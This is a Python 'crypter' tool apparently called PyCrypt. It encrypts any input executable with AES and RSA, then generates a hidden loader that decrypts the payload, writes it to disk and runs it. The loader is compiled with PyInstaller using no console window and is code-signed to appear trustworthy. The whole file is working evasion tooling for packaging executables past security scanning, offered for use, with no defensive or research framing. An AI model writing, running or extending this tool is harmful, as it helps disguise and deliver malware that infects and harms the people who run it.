import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode
import os  # Importing the os module

print("Welcome To PyCrypt. Created by: Py_Dev")

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key().decode('utf-8')
    public_key = key.publickey().export_key().decode('utf-8')
    return private_key, public_key

def encrypt_file(file_path, public_key):
    with open(file_path, 'rb') as f:
        data = f.read()

    # AES encryption
    aes_key = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_GCM)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    
    # RSA encryption of AES key
    rsa_key = RSA.import_key(public_key)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    encrypted_aes_key = rsa_cipher.encrypt(aes_key)
    
    encrypted_data = {
        'nonce': b64encode(nonce).decode('utf-8'),
        'ciphertext': b64encode(ciphertext).decode('utf-8'),
        'tag': b64encode(tag).decode('utf-8'),
        'encrypted_aes_key': b64encode(encrypted_aes_key).decode('utf-8')
    }

    return encrypted_data

def create_loader_script(private_key, encrypted_data):
    loader_script = f"""
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from base64 import b64decode
import subprocess

encrypted_data = {encrypted_data}
private_key = '''{private_key}'''

def decrypt_file():
    nonce = b64decode(encrypted_data['nonce'])
    ciphertext = b64decode(encrypted_data['ciphertext'])
    tag = b64decode(encrypted_data['tag'])
    encrypted_aes_key = b64decode(encrypted_data['encrypted_aes_key'])
    
    # RSA decryption to retrieve AES key
    rsa_key = RSA.import_key(private_key)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    aes_key = rsa_cipher.decrypt(encrypted_aes_key)
    
    # AES decryption
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
    
    return decrypted_data

decrypted_data = decrypt_file()

with open('decrypted.exe', 'wb') as f:
    f.write(decrypted_data)

# Execute the decrypted file
subprocess.call('decrypted.exe', shell=True)
"""

    with open('loader.py', 'w') as f:
        f.write(loader_script)

    # Run PyInstaller to create the loader executable
    result = subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'loader.py'], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"PyInstaller failed with error: {result.stderr}")
        return

    os.rename('dist/loader.exe', 'loader.exe')

    # Cleanup PyInstaller files
    shutil.rmtree('build')
    shutil.rmtree('dist')
    os.remove('loader.py')
    os.remove('loader.spec')

    # Sign the loader executable
    cert_file_path = os.path.abspath('mycert.pfx')
    cert_password = "YOURPASSHERE" #Replace with your digicert password you used to extract!
    timestamp_url = "http://timestamp.digicert.com"
    signtool_path = "C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\signtool.exe"  # Please replace this path with the path to your signed tool
    loader_file_path = os.path.abspath('loader.exe')

    sign_command = [
        signtool_path, 'sign', '/f', cert_file_path, '/p', cert_password,
        '/tr', timestamp_url, '/td', 'SHA256', '/fd', 'SHA256', '/v', loader_file_path
    ]

    result = subprocess.run(sign_command, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"Signtool failed with error: {result.stderr}")
    else:
        print("Loader executable signed successfully.")

def main(input_exe):
    private_key, public_key = generate_keys()
    encrypted_data = encrypt_file(input_exe, public_key)
    create_loader_script(private_key, encrypted_data)
    print("Loader executable created and signed as 'loader.exe'")

if __name__ == '__main__':
    import shutil
    input_exe = 'input.exe'  # Ensure this is the correct path to your input file
    main(input_exe)

